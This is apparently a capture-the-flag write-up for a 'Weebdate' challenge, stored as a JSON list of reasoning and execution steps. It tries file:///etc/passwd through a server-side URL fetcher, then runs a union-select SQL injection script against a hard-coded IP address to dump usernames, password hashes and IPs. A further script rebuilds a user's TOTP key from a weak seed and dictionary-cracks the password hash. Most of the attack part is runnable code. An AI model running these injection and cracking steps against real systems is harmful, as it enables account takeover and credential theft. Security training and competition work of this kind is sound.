@@ -1,0 +1,34 @@
+[
+    {
+        "type": "thought",
+        "content": "By visiting http://54.210.118.179/ we are presented with the Weebdate homepage. At first glance we see a 'sign up' and a 'login' page at:\n\nhttp://54.210.118.179/login\n\nand\n\nhttp://54.210.118.179/register"
+    },
+    {
+        "type": "execution",
+        "content": "curl http://54.210.118.179/login"
+    },
+    {
+        "type": "thought",
+        "content": "Let's first try to register a user:\n\nUSERNAME: gooby\n\nPASSWORD: 1\n\nAfter registration we are given a 'TOTP Key' and a QR code. The TOTP Key being 'QDQQFZ6AUZQ2YR6N' for the user gooby. Turns out the QR code is simply an encoded otpauth:// url with our username and secret inside. Incidentally (or not) the username is printed out unsanitised giving us a red herring XSS.\n\nThe nest step is to obviously try to login to Weebdate, when we look at the login page we see that we not only need our username and password, but also a \"totp verification code\" This totp token is an OtpAuth-token, which is based on an initial shared secret which is combined with the current time to generate tokens that are only valid for a certain period of time. So for this to work we need to sync our clock with the clock of the server. The server-timestamp is found in every HTTP response.\n\nWe need to take the initial 'TOTP Key' (which is our base32-encoded TOTP 'seed') and generate a valid totp-code."
+    },
+    {
+        "type": "execution",
+        "content": "#!/usr/bin/env python\n\nfrom otpauth import OtpAuth\nimport time, base64\n\nsecret = \"QDQQFZ6AUZQ2YR6N\" # key for gooby:1\nauth = OtpAuth(base64.b32decode(secret))\nprint \"[+]User: gooby, password:1\"\nprint \"[+]TOTP token: [%d]\" % auth.totp()\nprint \"[+]%s \" % time.strftime(\"%c\")"
+    },
+    {
+        "type": "thought",
+        "content": "We can now finally login to the application! :D. After login, we have the ability to:\n\nedit our profile via /profile/edit\nsearch for other users on the weebdate site via /search\nview and send messages via /messages\nNow, on the /profile/edit page, theres an option to specify a URL as profile image. The server-side code will fetch the contents of the URL and if it is a valid image, it will display it as a profile image. When the content returned is not a valid image however, the content is fully disclosed to the guest in an error message. Apparently, this server-side code was written in python and the URL is fetched with urlopen.urlopen. We can see this by feeding the application a non-existing or plain invalid URL\n\nhttp://ayylmao\n\nIf we input the above URL, the server responds with\n\n[...]\nMalformed url ParseResult(scheme=u'http', netloc=u'ayylmao', path=u'', params='', query='', fragment='')\n[...]\nThe good news here is that urlopen also supports other protocol handlers other than http:// or https://, file:// comes to mind for example\n\nLets say we want the content of /etc/passwd, we could try\n\nfile:///etc/passwd\n\nBut this gives the following output again\n\n[...]\nMalformed url ParseResult(scheme=u'file', netloc=u'', path=u'/etc/passwd', params='', query='', fragment='')\n[...]\nWe can see that the url we give to the application is parsed and netloc is empty, maybe it expects at least a netloc?\nUpon reading the application source code (in particular server.py and settings.py) we learn some new things:\n\nThe TOTP code is based on the first four characters of the username and the first octet of the ip-address of the user.\nTheres an sql injection vulnerability in /csp/view (function get_csp_report(report_id))\ndef get_csp_report(report_id):\n   cursor = mysql.connection.cursor()\n   cursor.execute(\n       \"select * from reports where report_id = %s\"% # uh-oh >:)\n       (report_id,)\n   )\n\n   return FetchOneAssoc(cursor)\nThe stored hash in the database is in the form sha256(username+password)\nTo make the sql injecting a little easier, i wrote a python script:"
+    },
+    {
+        "type": "execution",
+        "content": "import requests\n\nfor i in range(0,5):\n  payload = \"union all select concat(user_id,0x3a3a3a,user_name,0x3a3a3a,user_password,0x3a3a3a,user_ip,0x3a3a3a,user_image,0x3a3a3a,user_credits,0x3a3a3a,user_register_time),2,3 from users limit %d,1\" % i\n  url = \"http://54.210.118.179/csp/view/1 %s--\" % payload\n  r = requests.get(url)\n  print r.text"
+    },
+    {
+        "type": "thought",
+        "content": "By salvaging the methods generate_seed() and get_totp_key() from utils.py, we can generate the TOTP key from the ip-address and username.\n\nThe last thing we need is the password and by using one of the most simple john-the-ripper dictionaries we bruteforce the password. When we have the password we can generate the flag in the form md5($totp_key + $password)"
+    },
+    {
+        "type": "execution",
+        "content": "#!/usr/bin/env python\nimport hashlib, pyotp,random, itertools, socket, struct, string\n\n#{'report_ip': u'2', 'report_content': u'3', 'report_id': u'5:::donaldtrump:::22e59a7a2792b25684a43d5f5229b2b5caf7abf8fa9f186249f35cae53387fa3:::64.124.192.210:::http://i.imgur.com/6ebAqqF.png:::0:::0'}\n# We need to know the totp key, for that we need the seed:\n\ndef generate_seed(username, ip_address):\n   return int(struct.unpack('I', socket.inet_aton(ip_address))[0]) + struct.unpack('I', username[:4].ljust(4,'0'))[0]\n\ndef get_totp_key(seed):\n   random.seed(seed)\n   return pyotp.random_base32(16, random)\n\nusername = \"donaldtrump\"\nip_address=\"64.124.192.210\"\n\n# generate totp_key\nseed = generate_seed(username, ip_address)\ntotp_key = get_totp_key(seed)\n\nprint \"[+]Recovered totp_key: [%s] \" % totp_key\n\n# and we need to find the password, which is:\nsecret_hash = \"22e59a7a2792b25684a43d5f5229b2b5caf7abf8fa9f186249f35cae53387fa3\"\nfile = \"john.txt\"\nf = open(file, \"r\")\nfinal_password = \"\"\nfor password in f:\n  password = password.strip()\n  candidate = hashlib.sha256(username+password).hexdigest()\n  if candidate == secret_hash:\n  \tprint \"[+]Cracked password [ %s ] \" % password\n  \tfinal_password = password\n  \tbreak\n\nflag = hashlib.md5(totp_key+final_password).hexdigest()\nprint \"[+]Flag: [%s]\" % flag"
+    }
+]
